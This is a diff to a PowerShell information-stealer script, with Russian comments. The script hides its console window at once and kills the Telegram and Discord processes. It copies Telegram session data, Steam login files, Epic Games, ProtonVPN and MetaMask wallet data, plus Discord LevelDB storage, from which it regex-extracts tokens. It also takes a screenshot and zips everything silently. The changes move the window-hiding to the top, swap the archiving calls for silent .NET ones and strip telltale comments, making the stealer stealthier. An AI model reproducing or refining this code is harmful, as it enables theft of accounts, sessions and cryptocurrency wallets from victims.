@@ -1,3 +1,15 @@
+# Скрываем окно консоли сразу
+if (-not ("Console.Window" -as [type])) { 
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+    [DllImport("Kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+    '
+}
+$consoler = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consoler, 0) | Out-Null
+
 $ErrorActionPreference = 'silentlycontinue'
 $pcname = $env:COMPUTERNAME
 $RandomNumber = Get-Random
@@ -31,7 +43,7 @@ $vareb64 = "KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq
 $dcstrings = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($vareb64))
 $vare = "$dcstrings`nLog Name : $pcname`nLog Date : $DATE`n"
 
-# Создаём папки скрыто (без вывода)
+# Создаём папки скрыто
 $null = New-Item -ItemType Directory -Path $main -Force -ErrorAction SilentlyContinue
 $null = New-Item -ItemType Directory -Path $sessions -Force -ErrorAction SilentlyContinue
 $null = New-Item -ItemType Directory -Path $crypto -Force -ErrorAction SilentlyContinue
@@ -43,20 +55,6 @@ $proton = "Not Found"
 $metamask = "Not Found"
 $discord = "Not Found"
 $screenshot = "Not Found"
-
-function hide-me
-{
-    if (-not ("Console.Window" -as [type])) { 
-        Add-Type -Name Window -Namespace Console -MemberDefinition '
-        [DllImport("Kernel32.dll")]
-        public static extern IntPtr GetConsoleWindow();
-        [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-        '
-    }
-    $consoler = [Console.Window]::GetConsoleWindow()
-    $null = [Console.Window]::ShowWindow($consoler, 0)
-}
 
 function pcInfo() {
     $OS = (Get-WmiObject -class Win32_OperatingSystem).Caption
@@ -74,18 +72,17 @@ function networkInfo() {
     $info > $main\Network.txt
 }
 
-# ============ УЛУЧШЕННАЯ КРАЖА TELEGRAM (копируем всё tdata) ============
 function gettelegram {
     $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
     if (!(Test-Path $path)) { return }
     $processname = "telegram"
     try { if (Get-Process $processname -ErrorAction SilentlyContinue) { Get-Process -Name $processname | Stop-Process } } catch {}
     $destination = "$sessions\Telegram.zip"
-    # Копируем все файлы и папки без исключений
-    Compress-Archive -Path $path\* -DestinationPath $destination -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
+    # Используем .NET для архивации без прогресса
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $destination, [System.IO.Compression.CompressionLevel]::Fastest, $false) | Out-Null
 }
 
-# ============ УЛУЧШЕННАЯ КРАЖА STEAM (config, userdata, ssfn, *.vdf) ============
 function getsteam {
     $steamfolder = "${Env:ProgramFiles(x86)}\Steam"
     if (!(Test-Path $steamfolder)) { return }
@@ -94,22 +91,19 @@ function getsteam {
     $steam_session = "$env:TEMP\Vare-Steam"
     $null = New-Item -ItemType Directory -Force -Path $steam_session -ErrorAction SilentlyContinue
     
-    # Копируем всю папку config (включая loginusers.vdf)
     Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
-    # Копируем папку userdata (локальные данные аккаунтов)
     if (Test-Path "$steamfolder\userdata") {
         Copy-Item -Path "$steamfolder\userdata" -Destination $steam_session -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
     }
-    # Копируем все файлы ssfn*
     Get-ChildItem -Path $steamfolder -Filter "ssfn*" -File | ForEach-Object {
         Copy-Item -Path $_.FullName -Destination $steam_session -ErrorAction SilentlyContinue | Out-Null
     }
-    # Копируем все .vdf из корня
     Get-ChildItem -Path $steamfolder -Filter "*.vdf" -File | ForEach-Object {
         Copy-Item -Path $_.FullName -Destination $steam_session -ErrorAction SilentlyContinue | Out-Null
     }
     
-    Compress-Archive -Path $steam_session -DestinationPath "$sessions\Steam.zip" -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($steam_session, "$sessions\Steam.zip", [System.IO.Compression.CompressionLevel]::Fastest, $false) | Out-Null
     Remove-Item $steam_session -Recurse -Force -ErrorAction SilentlyContinue
 }
 
@@ -123,7 +117,8 @@ function getepic {
     Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
     Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
     Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
-    Compress-Archive -Path $epicgames_session -DestinationPath "$sessions\EpicGames.zip" -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($epicgames_session, "$sessions\EpicGames.zip", [System.IO.Compression.CompressionLevel]::Fastest, $false) | Out-Null
     Remove-Item $epicgames_session -Recurse -Force -ErrorAction SilentlyContinue
 }
 
@@ -146,7 +141,8 @@ function getproton {
         Copy-Item -Path $file.FullName -Destination $destinationPath -Force -ErrorAction SilentlyContinue | Out-Null
     }
     Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
-    Compress-Archive -Path $protonvpn_account -DestinationPath "$sessions\ProtonVPN.zip" -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($protonvpn_account, "$sessions\ProtonVPN.zip", [System.IO.Compression.CompressionLevel]::Fastest, $false) | Out-Null
     Remove-Item $protonvpn_account -Recurse -Force -ErrorAction SilentlyContinue
 }
 
@@ -171,7 +167,8 @@ function getmetamask {
             if (Test-Path -Path $newPath -PathType Container) {
                 $null = New-Item -ItemType Directory -Path $crypto -Force -ErrorAction SilentlyContinue
                 Copy-Item -Path $newPath -Destination $sessiontemp -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
-                Compress-Archive -Path $sessiontemp -DestinationPath "$crypto\$pathKey-MetaMask" -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
+                Add-Type -AssemblyName System.IO.Compression.FileSystem
+                [System.IO.Compression.ZipFile]::CreateFromDirectory($sessiontemp, "$crypto\$pathKey-MetaMask.zip", [System.IO.Compression.CompressionLevel]::Fastest, $false) | Out-Null
                 Remove-Item $sessiontemp -Recurse -Force -ErrorAction SilentlyContinue
             }
         }
@@ -263,7 +260,6 @@ function getSteamCookies {
     }
 }
 
-# ============ УЛУЧШЕННАЯ КРАЖА DISCORD (все папки приложений + LevelDB + браузерные Local Storage) ============
 function getDiscord {
     $discordPaths = @(
         "$env:APPDATA\discord",
@@ -273,16 +269,13 @@ function getDiscord {
     $discordFolder = "$sessions\Discord"
     $null = New-Item -ItemType Directory -Path $discordFolder -Force -ErrorAction SilentlyContinue
     
-    # Останавливаем все процессы Discord
     Get-Process -Name "discord*" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
     
-    # Копируем все папки Discord
     foreach ($p in $discordPaths) {
         if (Test-Path $p) {
             Copy-Item -Path $p -Destination $discordFolder -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
         }
     }
-    # Копируем Local Storage из браузеров (для веб-версии)
     $browserLocalStorage = @(
         "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\*discord*",
         "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile*\Local Storage\*discord*",
@@ -296,7 +289,6 @@ function getDiscord {
         }
     }
     
-    # Сохраняем LevelDB с токенами
     $leveldbPaths = @(
         "$env:APPDATA\discord\Local Storage\leveldb",
         "$env:APPDATA\discordptb\Local Storage\leveldb",
@@ -311,26 +303,21 @@ function getDiscord {
     }
 }
 
-# ============ ФУНКЦИЯ ДЛЯ ИЗВЛЕЧЕНИЯ И СОХРАНЕНИЯ ТОКЕНОВ (для ручного обновления) ============
 function refreshDiscordToken {
-    # Ищем все файлы, содержащие строки, похожие на токен Discord (длина ~70 символов)
     $tokenFiles = Get-ChildItem -Path "$sessions\Discord" -Recurse -Include "*.ldb","*.log","*.txt","*.json" -ErrorAction SilentlyContinue
     $tokens = @()
     foreach ($f in $tokenFiles) {
         $content = Get-Content $f.FullName -ErrorAction SilentlyContinue -Raw
         if ($content) {
-            # Ищем паттерн токена Discord: обычно mfa.xxxx или просто строка букв/цифр/точек длиной ~70
             $matches = [regex]::Matches($content, '[a-zA-Z0-9\.\-_]{70,}')
             foreach ($m in $matches) {
                 $tokens += $m.Value
             }
         }
     }
-    # Сохраняем уникальные токены
     if ($tokens.Count -gt 0) {
         $tokens = $tokens | Select-Object -Unique
         $tokens | Out-File "$sessions\Discord\found_tokens.txt" -Encoding utf8
-        $discord = "Found" # переопределим, чтобы в отчёте было Found
     }
 }
 
@@ -350,7 +337,6 @@ function takeScreenshot {
 }
 
 function startvare {
-    hide-me
     pcInfo
     networkInfo
     if ($telegramvr -eq "true") { gettelegram }
@@ -365,14 +351,14 @@ function startvare {
     if ($metavr -eq "true") { getmetamask }
     if ($discordvr -eq "true") { 
         getDiscord
-        refreshDiscordToken   # вызов после сбора Discord
+        refreshDiscordToken
     }
     if ($screenshotvr -eq "true") { takeScreenshot }
 }
 
 startvare
 
-# Проверка наличия собранных данных (для отчёта)
+# Проверка наличия собранных данных
 if (!(Test-Path "$sessions\Telegram.zip")) {} else { $telegram = "Found" }
 if (!(Test-Path "$sessions\Steam.zip")) {} else { $steam = "Found" }
 if (!(Test-Path "$sessions\ProtonVPN.zip")) {} else { $proton = "Found" }
@@ -384,7 +370,9 @@ if (!(Test-Path "$main\screenshot.png")) {} else { $screenshot = "Found" }
 $sessionscontent = "$vare`n========================================================`n`nTelegram  : $telegram`n`nSteam : $steam`n`nMetaMask : $metamask`n`nProtonVPN : $proton`n`nEpic Games : $epicgames`n`nDiscord : $discord`n`nScreenshot : $screenshot`n`n========================================================"
 $sessionscontent > "$main\Sessions.txt"
 
-Compress-Archive -Path $main -DestinationPath "$main.zip" -CompressionLevel Fastest -Force -ErrorAction SilentlyContinue | Out-Null
+# Создаём итоговый архив через .NET без прогресса
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::CreateFromDirectory($main, "$main.zip", [System.IO.Compression.CompressionLevel]::Fastest, $false) | Out-Null
 Remove-Item $main -Recurse -Force -ErrorAction SilentlyContinue
 
 $mainpath = "$main.zip"
